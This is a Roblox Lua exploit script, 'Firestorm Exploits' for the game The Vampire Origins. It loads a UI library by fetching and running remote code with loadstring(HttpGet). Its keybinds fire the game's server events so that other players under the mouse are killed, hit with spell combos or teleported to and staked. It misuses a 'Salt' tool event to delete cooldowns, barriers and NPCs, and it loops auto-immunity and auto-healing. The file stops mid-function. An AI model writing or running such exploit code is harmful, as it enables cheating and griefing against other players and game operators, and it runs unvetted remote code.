local localKeybinds = Instance.new("Folder",workspace)
localKeybinds.Name = "local Keybinds"
wait(0.5)
game.workspace["local Keybinds"].Archivable = false
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeianRussell/Kavo-UI-Library/main/Movable.source.lua"))()
local BennettWindow = Library.CreateLib("Firestorm Exploits | The Vampire Origins", "DarkTheme")
local Bennett = BennettWindow:NewTab("Keybinds")  -- Use BennettWindow here instead of Window
local BennettSection = Bennett:NewSection("Keybinds")

BennettSection:NewToggle("Keybinds On/Off", "", function(state)
    if state == true then
        game.workspace["local Keybinds"].Archivable = true
    else
        game.workspace["local Keybinds"].Archivable = false
    end
end)

BennettSection:NewKeybind("Kill (must have salt)", "",Enum.KeyCode.L, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = player.Character.Head
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))
                                    
        end
    end
end)

BennettSection:NewKeybind("Combo", "",Enum.KeyCode.E, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

          local args = {
                [1] = "corporis impetu",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
  
wait(0.4)
         local args = {
                [1] = "incendia",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

         local args = {
                [1] = "lucendi",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
            local args = {
                [1] = "errox femus",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

			local args = {
                [1] = "corporis impetu",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

			local args = {
                [1] = "incendia",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

            local args = {
                [1] = "suffuco",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
            



                                    
        end
    end
end)

BennettSection:NewKeybind("Delfan Eoten Cor", "",Enum.KeyCode.Z, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

            local args = {
                [1] = "delfan eoten cor",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
                                    
        end
    end
end)

BennettSection:NewKeybind("Ressurect spell (basic)", "",Enum.KeyCode.Five, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

local args = {
    [1] = "sanguine infudare corra",
    [2] = player.Character,
    [3] = CFrame.new(335.3482666015625, 10.283612251281738, 841.7147827148438, 0.9970464110374451, 0.018316147848963737, -0.07458620518445969, -7.462174211880779e-10, 0.9711463451385498, 0.23848454654216766, 0.07680223882198334, -0.23778016865253448, 0.9682778716087341),
    [4] = player.character.UpperTorso
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
              
        end
    end
end)

BennettSection:NewKeybind("Ad Somnum", "",Enum.KeyCode.J, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

local args = {
    [1] = "ad somnum",
    [2] = player.Character,
    [3] = CFrame.new(335.3482666015625, 10.283612251281738, 841.7147827148438, 0.9970464110374451, 0.018316147848963737, -0.07458620518445969, -7.462174211880779e-10, 0.9711463451385498, 0.23848454654216766, 0.07680223882198334, -0.23778016865253448, 0.9682778716087341),
    [4] = player.character.UpperTorso
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
              
        end
    end
end)

BennettSection:NewKeybind("Ossox", "",Enum.KeyCode.U, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

local args = {
    [1] = "ossox",
    [2] = player.Character,
    [3] = CFrame.new(335.3482666015625, 10.283612251281738, 841.7147827148438, 0.9970464110374451, 0.018316147848963737, -0.07458620518445969, -7.462174211880779e-10, 0.9711463451385498, 0.23848454654216766, 0.07680223882198334, -0.23778016865253448, 0.9682778716087341),
    [4] = player.character.UpperTorso
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
              
        end
    end
end)


BennettSection:NewKeybind("Sanitatem", "",Enum.KeyCode.Four, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

local args = {
    [1] = "sanitatem",
    [2] = player.Character,
    [3] = CFrame.new(335.3482666015625, 10.283612251281738, 841.7147827148438, 0.9970464110374451, 0.018316147848963737, -0.07458620518445969, -7.462174211880779e-10, 0.9711463451385498, 0.23848454654216766, 0.07680223882198334, -0.23778016865253448, 0.9682778716087341),
    [4] = player.character.UpperTorso
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
              
        end
    end
end)

BennettSection:NewKeybind("Invisique", "",Enum.KeyCode.P, function()
    if game.workspace["local Keybinds"].Archivable == true then
    if IsTyping then return end
    local Mouse = game.Players.LocalPlayer:GetMouse()

local args = {
        [1] = "invisique",
        [3] = CFrame.new(539.5877075195312, 8.34758472442627, 201.50225830078125, 0.34048065543174744, 0.017015725374221802, -0.9400975704193115, -1.7474732771916024e-10, 0.999836266040802, 0.01809699274599552, 0.9402515292167664, -0.006161675788462162, 0.34042489528656006)
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))    

    end
end)

BennettSection:NewKeybind("Motus", "",Enum.KeyCode.M, function()
    if game.workspace["local Keybinds"].Archivable == true then
    if IsTyping then return end
    local Mouse = game.Players.LocalPlayer:GetMouse()

local args = {
        [1] = "motus",
        [3] = CFrame.new(539.5877075195312, 8.34758472442627, 201.50225830078125, 0.34048065543174744, 0.017015725374221802, -0.9400975704193115, -1.7474732771916024e-10, 0.999836266040802, 0.01809699274599552, 0.9402515292167664, -0.006161675788462162, 0.34042489528656006)
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))    

    end
end)

BennettSection:NewKeybind("Suurenta", "",Enum.KeyCode.Y, function()
    if game.workspace["local Keybinds"].Archivable == true then
    if IsTyping then return end
    local Mouse = game.Players.LocalPlayer:GetMouse()

local args = {
    [1] = "suurenta",
    [3] = CFrame.new(339.8954162597656, 19.779239654541016, 409.0306396484375, -0.6420660018920898, 0.48788344860076904, -0.5913723111152649, 6.5815664029855725e-09, 0.7713725566864014, 0.6363840103149414, 0.7666494250297546, 0.4086005389690399, -0.4952720105648041)
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

    end
end)

BennettSection:NewKeybind("Self Heal", "",Enum.KeyCode.One, function()
    if game.workspace["local Keybinds"].Archivable == true then
    if IsTyping then return end
    local Mouse = game.Players.LocalPlayer:GetMouse()

local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))

    end
end)


BennettSection:NewKeybind("Self Channel", "",Enum.KeyCode.Two, function()
    if game.workspace["local Keybinds"].Archivable == true then
    if IsTyping then return end
    local Mouse = game.Players.LocalPlayer:GetMouse()

            local args = {
                [1] = "phasmatos magicae",
                [2] = game.Players.LocalPlayer.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = game.Players.LocalPlayer.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

    end
end)

BennettSection:NewKeybind("incendia", "",Enum.KeyCode.N, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

            local args = {
                [1] = "incendia",
                [2] = player.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = player.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
              
        end
    end
end)

BennettSection:NewKeybind("Fato Ya Si", "",Enum.KeyCode.B, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

local args = {
    [1] = "fato ya si",
    [2] = player.Character,
    [3] = CFrame.new(335.3482666015625, 10.283612251281738, 841.7147827148438, 0.9970464110374451, 0.018316147848963737, -0.07458620518445969, -7.462174211880779e-10, 0.9711463451385498, 0.23848454654216766, 0.07680223882198334, -0.23778016865253448, 0.9682778716087341),
    [4] = player.character.UpperTorso
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
              
        end
    end
end)

BennettSection:NewKeybind("Cure someone with a stake", "",Enum.KeyCode.Three, function()
    if game.workspace["local Keybinds"].Archivable == true then
    local function getPlayer()
            local userInput = game:GetService("UserInputService")
            local cam = workspace.CurrentCamera
            local mousePos = userInput:GetMouseLocation()
            local mouseRay = cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            players = {}
            for _, x in next, game:GetService('Players'):GetPlayers() do
                players[#players + 1] = x.Character
            end
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Whitelist
            raycastParams.FilterDescendantsInstances = players
            raycastParams.IgnoreWater = true
            local raycastResult = workspace:Raycast(mouseRay.Origin, mouseRay.Direction * 1000, raycastParams)
            if raycastResult then
                for _, x in next, game:GetService('Players'):GetPlayers() do
                    if not raycastResult.Instance:IsDescendantOf(x.Character) then
                        continue 
                    end
                    return x
                end
            end
            return false
        end
        local function Set(list)
            local set = {}
            for _, l in ipairs(list) do
                if l then
                    set[l] = true
                end
            end
            return set
        end
        if IsTyping then return end
        local player = getPlayer()
        if player then
            local pos = player.Character.HumanoidRootPart.CFrame

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
wait(0.5)
local args = {
    [1] = "CureOther",
    [2] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Stake"),
    [3] = player.Character
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("Tool"):FireServer(unpack(args))

                                                                       
        end
    end
end)

local Bennett = BennettWindow:NewTab("Self Stuff")
local BennettSection = Bennett:NewSection("Client")
BennettSection:NewButton("Self Channel", "", function()
            local args = {
                [1] = "phasmatos magicae",
                [2] = game.Players.LocalPlayer.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = game.Players.LocalPlayer.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
end)

BennettSection:NewButton("LoopDelete channel (must have salt)", "", function()
while wait() do
 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = game:GetService("Players").LocalPlayer.Character:WaitForChild("Channeled")
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))
end
end)

BennettSection:NewButton("Self Bulla", "", function()
            local args = {
                [1] = "bulla",
                [2] = game.Players.LocalPlayer.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = game.Players.LocalPlayer.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
end)

BennettSection:NewButton("Self Inspire (Cleo)", "", function()

local args = {
    [1] = game.Players.LocalPlayer.Character,
    [2] = Enum.UserInputType.MouseButton1,
    [3] = "Inspire",
    [4] = CFrame.new(335.4281311035156, 10.26990795135498, 849.1193237304688, 0.9952189922332764, 0.0256524458527565, -0.0942395031452179, 1.2478561517426101e-09, 0.9648916721343994, 0.26264819502830505, 0.09766846895217896, -0.2613924741744995, 0.9602785706520081)
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("WitchKeybind"):FireServer(unpack(args))

end)

BennettSection:NewButton("Self Og (Esther)", "", function()

      local args = {
                [1] = "fortis lamia",
                [2] = game.Players.LocalPlayer.Character,
                [3] = CFrame.new(398.7474670410156, 10.13139820098877, 269.7151184082031, 0.999862015247345, -0.003389145014807582, 0.01626567728817463, 2.0190227267846694e-10, 0.9789749383926392, 0.20398089289665222, -0.016615010797977448, -0.20395274460315704, 0.9788397550582886),
                [4] = game.Players.LocalPlayer.Character.UpperTorso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

end)

BennettSection:NewButton("Self cure with a stake", "", function()
-- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = "Cure",
    [2] = game.Players.LocalPlayer.Character.Stake
}

game:GetService("ReplicatedStorage").Events.Action.Tool:FireServer(unpack(bennettscripts))


end)

local Bennett = BennettWindow:NewTab("Exploit")
local BennettSection = Bennett:NewSection("Exploit")

BennettSection:NewButton("no cd (must have salt)", "", function()

game.Players.LocalPlayer.Cooldown.ChildAdded:Connect(function(child)
game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(child)
end)

while wait() do
bennettscripts = {
    [1] = game.Players.LocalPlayer:WaitForChild("Healed")
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))
end

end)

BennettSection:NewButton("Delete salt barrier", "", function()

while wait() do
game.Workspace:WaitForChild("Barrier"):Destroy()
end

end)

BennettSection:NewButton("Delete Davina (salt)", "", function()


bennettscripts = {
    [1] = game.ReplicatedStorage.Modules.CharacterConfig.Characters.Davina.Outfit1.Humanoid
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))


bennettscripts = {
    [1] = game.ReplicatedStorage.Modules.CharacterConfig.Characters["Harvest Davina"].Outfit1.Humanoid
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))

end)

BennettSection:NewButton("Delete Ken (salt)", "", function()


bennettscripts = {
    [1] = game.ReplicatedStorage.Modules.CharacterConfig.Characters.Ken.Outfit1.Humanoid
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))


end)


--auto things

_G.AutoPun = true

function AutoPun()

while _G.AutoPun == true do
    local Player = game.Players.LocalPlayer
	local Character = Player.Character
	local Live = game.Workspace.Players
	local RunService = game:GetService("RunService")
	local Debounce = false
        local plr = game:GetService("Players").LocalPlayer
		if not game.Players.LocalPlayer.Character:FindFirstChild("Immune") and game.Workspace.Players:FindFirstChild(game.Players.LocalPlayer.Character.Name) then
local args = {
    [1] = "resistus maledi",
    [3] = CFrame.new(447.7152099609375, 10.240480422973633, 102.25967407226562, 0.7908974885940552, 0.059047941118478775, -0.6090932488441467, 4.878080606118829e-09, 0.9953339099884033, 0.09649164229631424, 0.6119487881660461, -0.0763150006532669, 0.7872070074081421)
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))

		end
wait(.0000000000000000000000000000000000000000000000000001)
end
end

BennettSection:NewToggle("Auto Immunity", "", function(Value)
    print("You just clicked the bind")
		_G.AutoPun = Value
                AutoPun()
        end)

--auto things

_G.AutoPunc = true

function AutoPunc()

while _G.AutoPunc == true do
    local Player = game.Players.LocalPlayer
	local Character = Player.Character
	local Live = game.Workspace.Players
	local RunService = game:GetService("RunService")
	local Debounce = false
        local plr = game:GetService("Players").LocalPlayer
		if plr.Character.Humanoid.Health > 0 and plr.Character.Humanoid.Health < 299 then
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

